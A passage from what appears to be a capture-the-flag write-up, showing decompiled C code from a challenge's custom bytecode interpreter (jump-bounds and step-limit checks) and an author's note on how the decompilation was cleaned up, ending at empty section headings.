          if ( v17 >= USER_SCRIPT_LEN )
          {
ILLEGAL_JUMP:
            printf("y u trying to jmp to those places\n", 1u, 34, off_4BD6A8);
            exit(1);
          }
          goto LABEL_14;
        }
        v10 = USER_SCRIPT_LEN;
        v11 = USER_SCRIPT;
        v17 = sub_403740(USER_SCRIPT, USER_SCRIPT_LEN, &v34, v17);
        if ( !v15 )
          goto LABEL_40;
      }
      IP = v17;
      if ( v17 >= USER_SCRIPT_LEN )
        goto ILLEGAL_JUMP;
      if ( !--v14 )
      {
LABEL_44:
        printf("y u take this long\n", 1u, 19, off_4BD6A8);
        exit(1);
      }
    }
  }
  fatal_perror("read /dev/urandom");
  safe_close(urandom);
  return 1;
}
```

**Note:** this decompilation was achieved after some effort labelling things and setting types. Most likely if you just chucked this in a decompiler it would be pretty messy (it still is due to a lot of jumping caused by `switch case` probably initally). For example, i had to set the type of `registers` to get a clean understanding of the indexing operations on the registers.

##### The goal of our program



#### Assembling
